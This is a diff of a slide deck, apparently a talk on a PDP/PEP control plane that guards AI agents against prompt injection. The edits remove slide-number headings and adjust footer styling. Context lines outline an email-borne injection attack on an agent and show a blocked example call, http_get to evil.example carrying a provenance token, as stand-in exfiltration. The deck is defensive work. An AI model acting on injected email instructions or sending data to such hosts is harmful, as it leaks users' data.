@@ -31,8 +31,11 @@ style: |
   }
 
   section::after {
-    font-size: 12px;
+    font-size: 11px;
     color: var(--color-muted);
+    font-family: 'Inter', sans-serif;
+    bottom: 18px;
+    right: 28px;
   }
 
   h1 {
@@ -194,7 +197,6 @@ style: |
 
 ---
 
-## Slide 2 / 14 · ~1 min
 ## The problem is new. The attack surface is real.
 
 Agents don't just answer questions.
@@ -215,7 +217,6 @@ The security stacks that exist today were not built for this:
 
 ---
 
-## Slide 3 / 14 · ~1 min
 ## This is what an attack looks like today
 
 User asks: *"Summarize my unread emails."*
@@ -238,7 +239,6 @@ They just need to put content somewhere the agent will read it.
 
 ---
 
-## Slide 4 / 14 · ~45 sec
 ## What happens without a control plane
 
 The LLM reads the email body.
@@ -258,7 +258,6 @@ enterprise copilot with millions of users.
 
 ---
 
-## Slide 5 / 14 · ~45 sec
 ## What we built
 
 A **Policy Decision Point / Policy Enforcement Point** (PDP/PEP) architecture —
@@ -282,7 +281,6 @@ PEP enforces — block raises, agent reports it was stopped
 
 ---
 
-## Slide 6 / 14 · ~45 sec
 ## Check 1 — Egress allowlist
 
 > *"Is this destination declared in policy?"*
@@ -307,7 +305,6 @@ A call to an undeclared host is a configuration error, not a false positive.
 
 ---
 
-## Slide 7 / 14 · ~45 sec
 ## Check 2 — Prompt carrier scan
 
 > *"Does this tool output contain an injected instruction?"*
@@ -328,7 +325,6 @@ The LLM never sees the instruction. `http_get` is never attempted.
 
 ---
 
-## Slide 8 / 14 · ~45 sec
 ## Check 3 — Provenance token
 
 > *"Did retrieved content influence this tool call?"*
@@ -355,7 +351,6 @@ http_get(url="evil.example/…A3F9C2D1…")  →  provenance token found → BLO
 
 ---
 
-## Slide 9 / 14 · ~30 sec
 ## Active vs. Monitor mode
 
 | | **Active** | **Monitor** |
@@ -371,7 +366,6 @@ When you're confident in the policy, flip to Active.
 
 ---
 
-## Slide 10 / 14 · ~1 min 15 sec
 ## Live demo
 
 ```bash
@@ -395,7 +389,6 @@ When you're confident in the policy, flip to Active.
 
 ---
 
-## Slide 11 / 14 · ~45 sec
 ## Why this architecture
 
 **Why not a network proxy?**
@@ -416,7 +409,6 @@ The PDP has no knowledge of the agent's task — policy is evaluated cleanly out
 
 ---
 
-## Slide 12 / 14 · ~30 sec
 ## Where this sits in the defense stack
 
 ```
@@ -438,7 +430,6 @@ Network controls can't see tool-call semantics.
 
 ---
 
-## Slide 13 / 14 · ~30 sec
 ## What this maps to in production
 
 | This demo | Production equivalent |
@@ -455,7 +446,6 @@ Any agent built on MCP gets enforcement without code changes.
 
 ---
 
-## Slide 14 / 14 · ~15 sec
 ## Status + what's next
 
 **Done**
